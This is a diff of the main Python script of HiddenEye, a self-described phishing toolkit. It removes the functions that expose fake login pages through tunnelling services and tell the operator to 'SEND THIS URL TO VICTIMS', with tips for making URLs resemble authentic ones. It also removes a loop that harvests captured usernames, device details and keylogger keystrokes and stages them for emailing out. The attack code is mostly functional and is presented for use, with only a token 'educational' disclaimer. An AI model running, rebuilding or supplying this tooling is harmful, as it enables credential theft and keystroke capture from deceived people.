@@ -20,13 +20,6 @@ languageSelector()
 ifSettingsNotExists()
 config = readConfig()
 
-logFile = None
-didBackground = config.get("Settings", "DidBackground")
-for arg in argv:
-    if arg == "--nolog":  # If true - don't log
-        didBackground = False
-if config.get("Settings", "DidBackground") == "True":
-    logFile = open("log.txt", "w")
 
 colorTheme = colorSelector()
 MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[
@@ -54,276 +47,22 @@ def selectPort():  # Question where user must select port
         return selectPort()
 
 
-def selectServer(port):  # Question where user must select server
-    system('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print(
-        "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
-    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo {0}(Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel \n {0}[{1}5{0}]{1}OpenPort\n {0}[{1}6{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
 
-    choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
-    if choice == '0':
-        system('clear')
-        runLocalhost(port)
-    elif choice == '1':
-        system('clear')
-        runNgrok(port)
-    elif choice == '2':
-        system('clear')
-        runServeo(port)
-    elif choice == '3':
-        system('clear')
-        runLocalxpose(port)
-    elif choice == '4':
-        system('clear')
-        runLT(port, True)
-    elif choice == '5':
-        system('clear')
-        runOpenport(port)
-    elif choice == '6':
-        system('clear')
-        runPagekite(port)
-    else:
-        system('clear')
-        return selectServer(port)
 
-def runLocalhost(port):
-    system('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
-    host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
-    system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
-    system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
-    print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
-    sleep(2)
-    system('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RUNNING LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print("\n{0}[{1}!{0}]{1} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://{4}:{3}\n".format(MAIN0, MAIN2, MAIN3, port, host))
-    print("\n")
-
-def runPagekite(port):
-	system('clear')
-	print('''
-		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-		{0}http://github.com/darksecdevelopers
-		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-	if 256 == system('which python2 > /dev/null'):
-		print('[*] Python2 not Installed, Pagekite Only Supports Python2!!')
-		input('\n Press Enter To Try installing Python2 Now..')
-		system('apt install python2')
-		if 256 == system('which python2 > /dev/null'):
-			system('clear')
-			print("\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}".format(MAIN0, MAIN4))
-			sleep(2)
-			selectServer(port)
-		else:
-			pass	
-	else:
-		try:
-			subdomain = input("\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
-			print("\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
-			print("{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}".format(MAIN0, MAIN4))
-			input("\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
-			system('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
-		except KeyboardInterrupt:
-			print('[!] Please Copy the Generated Link For Further Use')
-			getCredentials(port)
 
 			
-def runOpenport(port):
-	system('clear')
-	print('''
-		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-		{0}http://github.com/darksecdevelopers
-		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-	if 256 == system('which openport > /dev/null'):
-		system('clear')
-		print('[*] Openport not Installed correctly, Try installing it manually !!')
-		print('[*] Check Here ... https://openport.io/download')
-		input('\n Press Enter To Go back..')
-		selectServer(port)
-	else:
-		manageOpenporturl(port)
-
-def manageOpenporturl(port):
-	system('rm output.txt > /dev/null 2>&1')
-	system('openport -K && openport %s > output.txt &' % (port)) 
-	print('{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait.'.format(MAIN0, MAIN4))
-	sleep(20) # Sleep time is important as the openport command takes some time to give response link.
-	system('cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt') # Taking out the neccesary verification link from output txt file of openport (above). 
-	print('{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...'.format(MAIN0, MAIN4))
-	with open('openport.txt') as f:
-		read_data = f.read()
-		if 'openport.io/l/' in read_data:
-			print('{0}[{1}*{0}] {1}Got Activation Link...'.format(MAIN0, MAIN4))
-			pass
-		else:
-			print('{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... '.format(MAIN0, MAIN4))
-			output = open('output.txt', 'r')
-			output = output.read()
-			print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(MAIN0, MAIN4, output))
-			input('\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(MAIN0, MAIN4))
-			selectServer(port)
-		
-	urlFile = open('openport.txt', 'r')
-	urltoverify = urlFile.read().strip()
-	print('{0}[{1}*{0}] {1}Open This Activation Link From Browser to Get Tunnel Link...\n'.format(MAIN0, MAIN4))
-	print('{0}[{1}*{0}] {1}Tunnel Activation Link:{0}{2} '.format(MAIN0, MAIN4, urltoverify))
-	url = input('\n\n{0}[{1}*{0}] {1}Enter The Tunnel Link Found in Browser: {0} '.format(MAIN0, MAIN4,))
-	sleep(4)
-	system('clear')
-	print('''
-	    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-	    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-	    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-	    {0}http://github.com/darksecdevelopers
-	    {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-	print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n".format(MAIN0, MAIN4, MAIN3, port, url))
-
-def runNgrok(port):
-    system('killall -2 ngrok > /dev/null')
-    system('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    system('./Server/ngrok http {} > /dev/null &'.format(port))
-    while True:
-        sleep(2)
-        system(
-            'curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > link.url')
-        urlFile = open('link.url', 'r')
-        url = urlFile.read()
-        urlFile.close()
-        if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-            print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
-                MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
-            print("\n")
-            break
 
 
-def runLocalxpose(port):
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n'''.format(MAIN0, MAIN2))
-    print("\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
-    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(MAIN0, MAIN2))
-    choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
-    system('clear')
-    if choice == '1':
-
-        customLocalxpose(port)
-    elif choice == '2':
-        randomLocalxpose(port)
-    else:
-        system('clear')
-        return runLocalxpose(port)
 
 
-def customLocalxpose(port):
-
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)'''.format(MAIN0, MAIN2))
-    lnk = input("\n{0}CUSTOM Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
-    system('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
-    sleep(7)
-    try:
-        output = check_output(
-            "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = output.decode("utf-8")
-        system('clear')
-        print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}".format(
-            MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
-        print("\n")
-
-    except CalledProcessError:
-        print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
-'''.format(MAIN0, MAIN4))
-        sleep(4)
-        system('clear')
-        return customLocalxpose(port)
 
 
-def randomLocalxpose(port):
-    system('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM LOCALXPOSE URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    system('./Server/loclx tunnel http --to :%s > link.url 2> /dev/null &' % (port))
-    sleep(8)
-    try:
-        output = check_output(
-            "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
-        url = output.decode('utf-8')
-        print("\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}".format(
-            MAIN0, MAIN4, MAIN3, port, url) + "{1}".format(MAIN0, MAIN4, MAIN3))
-        print("\n")
-    except CalledProcessError:
-
-        sleep(4)
-        system('clear')
-        return randomLocalxpose(port)
 
 
-def runServeo(port):
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. '''.format(MAIN0, MAIN2))
-    print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
-    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(MAIN0, MAIN2))
-    choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
-    system('clear')
-    if choice == '1':
 
-        customServeo(port)
-    elif choice == '2':
-        randomServeo(port)
-    else:
-        system('clear')
-        return runServeo(port)
+
+
+
 
 
 def customServeo(port):
@@ -387,42 +126,6 @@ def randomServeo(port):
         system('clear')
         return randomServeo(port)
 
-
-def runLT(port, npm):
-    system('clear')
-    print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print(
-        "\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
-    print("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL".format(MAIN0, MAIN2))
-    s = input('\n{0}(Localtunnel/Subdomain)> {2}'.format(MAIN0, MAIN4, MAIN2))
-    try:
-        system('{0}lt -p '.format('' if npm else 'Server/') +
-               port+((' -s '+s) if s != '' else s)+' > link.url &')
-        sleep(3)
-        system('clear')
-        print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}".format(
-            MAIN0, MAIN2, MAIN3, port, str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)).strip("b ' \ n r")))
-    except CalledProcessError:
-        system('clear')
-        print('''
-        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-        {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-        print('{0}error[invalid/preoccupied]{0}'.format(MAIN0))
-        runLT(port, npm)
 
 
 def runMainMenu():  # menu where user select what they wanna use
@@ -886,95 +589,10 @@ def runServer(port):
     system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
 
 
-def emailPrompt3(port):  # Ask user to start sending credentials to recipient Email Address.
-    choice = input(
-        "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
-    if choice == 'Y' or choice == 'y':
-        if path.isfile('Defs/Send_Email/emailconfig.py') == True:
-            system('python3 Defs/Send_Email/SendEmail.py')
-        else:
-            print(
-                '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
-            sleep(2)
-            endMessage(port)
-    elif choice == 'N' or choice == 'n':
-        endMessage(port)
-    else:
-        system('clear')
-        print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(
-            MAIN0, MAIN4, MAIN2))
-        sleep(1)
-        system('clear')
-        return emailPrompt3(port)
-
-def endMessage(port):  # Message when HiddenEye exit
-    choice = input(
-        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
-    if choice == 'R' or choice == 'r':
-        system('sudo python3 HiddenEye.py')
-    elif choice == 'M' or choice == 'm':
-        emailPrompt3(port)
-    elif choice == 'S' or choice == 's':
-    	returnServer(port)
-    elif choice == 'X' or choice == 'x':
-        system('clear')
-        print('''
-                  {3}HIDDEN EYE {3}BY: DARKSEC TEAM
-            {1}https://github.com/DarkSecDevelopers/HiddenEye
-
-  {3}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
-  {0}
-     [{3}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
-     [{3}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
-     [{3}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
-     [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
-     [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
-
-  {3}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
-    else:
-        system('clear')
-        return endMessage(port)
 
 def returnServer(port):
 	selectServer(port)
 
-def getCredentials(port):
-
-    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n{2}________________________________________________________________________________\n".format(MAIN0, MAIN2, MAIN4))
-    while True:
-        with open('Server/www/usernames.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                writeLog('\n {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}'.format(
-                    MAIN2, MAIN3, lines))
-                system("touch Server/CapturedData/usernames.txt && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt && echo -n '' > Server/www/usernames.txt")
 
 
-        with open('Server/www/ip.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                writeLog('\n {0}[{1} DEVICE DETAILS FOUND {0}]{1}:\n {0}{2}{1}'.format(
-                    MAIN2, MAIN3, lines))
-                system('touch Server/CapturedData/ip.txt && cat Server/www/ip.txt >> Server/CapturedData/ip.txt && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
 
-        creds.close()
-
-        with open('Server/www/KeyloggerData.txt') as creds:
-            lines = creds.read().rstrip()
-            if len(lines) != 0:
-                writeLog(
-                    '{0}...............................'.format(MAIN0, MAIN4))
-                writeLog(
-                    ' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}{1}'.format(MAIN3, MAIN2, lines))
-                system('touch Server/CapturedData/KeyloggerData.txt && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt && rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
-                writeLog(
-                    '{0}...............................'.format(MAIN0, MAIN4))
-
-        creds.close()
-
-
-def writeLog(ctx):  # Writing log
-    if config.get("Settings", "DidBackground") == "True":  # if didBackground == True, write
-        logFile.write(ctx.replace(MAIN0, "").replace(MAIN1, "").replace(
-            MAIN2, "").replace(MAIN3, "").replace(MAIN4, "") + "\n")
-    print(ctx)
